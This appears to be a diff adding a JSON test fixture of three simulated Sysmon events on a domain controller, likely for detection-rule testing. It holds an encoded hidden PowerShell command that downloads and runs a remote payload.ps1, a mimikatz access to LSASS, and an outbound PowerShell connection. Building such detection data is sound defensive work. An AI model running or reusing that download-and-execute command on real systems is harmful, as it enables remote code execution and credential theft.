@@ -1,0 +1,47 @@
+[
+  {
+    "_time": "2026-08-21T10:06:40.000Z",
+    "EventCode": "1",
+    "EventDescription": "Process Create",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAA6ADgAMAAwADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\john.doe",
+    "Computer": "DC-01.corp.local",
+    "host": "DC-01",
+    "index": "sysmon",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+  },
+  {
+    "_time": "2026-08-21T10:06:55.000Z",
+    "EventCode": "10",
+    "EventDescription": "Process accessed (LSASS)",
+    "SourceImage": "C:\\Users\\Public\\mimikatz.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\System32\\KERNELBASE.dll+25a40|C:\\Users\\Public\\mimikatz.exe+32d1",
+    "SourceUser": "CORP\\john.doe",
+    "TargetUser": "NT AUTHORITY\\SYSTEM",
+    "Computer": "DC-01.corp.local",
+    "host": "DC-01",
+    "index": "sysmon",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+  },
+  {
+    "_time": "2026-08-21T10:07:30.000Z",
+    "EventCode": "3",
+    "EventDescription": "Network connection detected",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "SourceIp": "192.168.1.50",
+    "SourcePort": "49821",
+    "DestinationIp": "198.51.100.45",
+    "DestinationPort": "443",
+    "Protocol": "tcp",
+    "Initiated": "true",
+    "User": "CORP\\john.doe",
+    "Computer": "DC-01.corp.local",
+    "host": "DC-01",
+    "index": "sysmon",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+  }
+]
